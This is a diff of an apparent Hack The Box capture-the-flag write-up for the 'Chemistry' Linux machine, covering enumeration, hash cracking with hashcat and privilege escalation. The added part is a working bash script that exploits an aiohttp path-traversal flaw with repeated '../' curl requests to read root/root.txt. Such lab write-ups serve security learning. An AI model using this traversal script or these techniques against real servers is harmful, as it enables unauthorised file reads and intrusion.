@@ -11,7 +11,7 @@ Objective: Hack the Linux machine, level: easy.
 ## Procedure
 I know why you're here. You need advice because you're still figuring this stuff out. Trust me, I was there too. We all hit walls sometimes. For example, it took me two hours just to grab the root flag.
 
-#### Enumeration
+### Enumeration
 
 Alright, enumeration is key. Using nmap, we identify the services and other useful info.
 
@@ -38,7 +38,7 @@ It’s just a login and register page. Let’s register.
 
 ![Register](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/Register.png)
 
-#### Ataquing
+### Ataquing
 
 Oh, we can upload files. This is interesting. Maybe we can drop a reverse shell. Let’s upload a CIF file.
 
@@ -112,7 +112,7 @@ sudo hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ![attacking the hash](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/hashattack.png)
 
-#### Privilage escalation part 1
+### Privilage escalation
 
 Nice, we’ve got the password for "rose." Let’s try logging in via SSH.
 
@@ -148,9 +148,30 @@ Let’s check for vulnerabilities in aiohttp.
 ![CVE aiohtt](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/FIndingCVEaiohttp.png)
 
 Boom, found a vulnerability. Let’s upload the exploit where Rose is and tweak it. This web app doesn’t have static files, just assets. Our target? root.txt.
+```sh
+#!/bin/bash
 
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="root/root.txt" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done 
+```
 
 ![rootflag](https://github.com/Diegomjx/Hack-the-box-Writeups/blob/master/easy/ChemistryHTB/Images/rootflag.png)
+
+
 
 We got it. Root flag’s ours.
 
